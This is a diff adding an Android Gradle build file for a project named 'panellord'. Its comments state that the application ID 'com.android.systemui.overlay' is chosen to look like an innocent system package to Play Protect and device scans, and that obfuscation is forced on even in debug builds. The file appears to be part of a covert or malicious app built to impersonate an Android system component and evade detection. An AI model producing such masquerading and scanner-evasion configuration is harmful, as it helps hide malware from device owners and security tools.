@@ -1,0 +1,40 @@
+plugins {
+    id 'com.android.application'
+}
+
+android {
+    namespace 'com.panellord'
+    compileSdk 33
+
+    defaultConfig {
+        // Innocent system-looking package — what Play Protect & device scan sees
+        applicationId "com.android.systemui.overlay"
+        minSdk 26
+        targetSdk 33
+        versionCode 4
+        versionName "4.2.1"
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled true
+            shrinkResources false
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+        debug {
+            // R8 obfuscation ON even for debug — renames classes to a/b/c
+            minifyEnabled true
+            shrinkResources false
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+    }
+
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_1_8
+        targetCompatibility JavaVersion.VERSION_1_8
+    }
+}
+
+dependencies {
+    // No extra dependencies needed — uses Android SDK only
+}
